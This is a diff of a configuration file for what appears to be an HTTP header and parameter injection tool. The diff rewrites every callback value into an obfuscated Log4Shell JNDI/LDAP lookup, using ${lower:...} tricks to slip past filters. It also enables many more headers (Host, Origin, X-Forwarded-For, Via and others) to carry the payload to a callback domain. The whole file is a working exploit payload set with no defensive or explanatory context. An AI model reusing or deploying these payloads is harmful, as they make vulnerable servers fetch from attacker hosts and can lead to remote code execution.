@@ -1,45 +1,45 @@
 # Lines starting with # are ignored
-#param,u,http://%s/
-#param,href,http://%s/
-#param,action,http://%s/
-#param,host,%s
-#param,http_host,%s
-#param,email,root@%s
-#param,url,http://%s/
-#param,load,http://%s/
-#param,preview,http://%s/
-#param,target,http://%s/
-#param,proxy,http://%s/
-#param,from,http://%s/
-#param,src,http://%s/
-#param,ref,http://%s/
-#param,referrer,http://%s/
+#param,u,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,href,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,action,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+#param,http_host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+#param,email,root@${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+#param,url,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,load,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,preview,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,target,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,proxy,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,from,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,src,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,ref,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+#param,referrer,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
 # %h is replaced with corresponding Host header
 # Useful in cases like Host, Origin, etc.
-#header,Host,%s:80@%h
-header,Contact,root@%s
-header,From,root@%s
-header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@%s
-header,Referer,http://%s/ref
-#header,X-Original-URL,http://%s/
-header,X-Wap-Profile,http://%s/wap.xml
-#header,Profile,http://%s/wap.xml
-#header,X-Arbitrary,http://%s/
-#header,X-HTTP-DestinationURL,http://%s/
-#header,X-Forwarded-Proto,http://%s/
-#header,Origin,http://%s
-#header,X-Forwarded-Host,%s
-#header,X-Forwarded-Server,%s
-#header,X-Host,%s
-#header,Proxy-Host,%s
-#header,Destination,%s
-#header,Proxy,http://%s
-#header,Via,1.1 %s
-header,X-Forwarded-For,spoofed.%s
-header,True-Client-IP,spoofed.%s
-header,Client-IP,spoofed.%s
-header,X-Client-IP,spoofed.%s
-header,X-Real-IP,spoofed.%s
-header,X-Originating-IP,spoofed.%s
-header,CF-Connecting_IP,spoofed.%s
-header,Forwarded,for=spoofed.%s;by=spoofed.%s;host=spoofed.%s
+#header,Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}:80@%h
+header,Contact,root@${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,From,root@${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,Referer,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/ref
+header,X-Original-URL,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+header,X-Wap-Profile,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/wap.xml
+header,Profile,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/wap.xml
+header,X-Arbitrary,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+header,X-HTTP-DestinationURL,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+header,X-Forwarded-Proto,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}/
+header,Origin,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,X-Forwarded-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,X-Forwarded-Server,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,X-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,Proxy-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,Destination,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,Proxy,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,Via,1.1 ${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,X-Forwarded-For,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,True-Client-IP,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,Client-IP,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,X-Client-IP,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,X-Real-IP,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,X-Originating-IP,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,CF-Connecting_IP,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
+header,Forwarded,for=spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s};by=spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s};host=spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s}
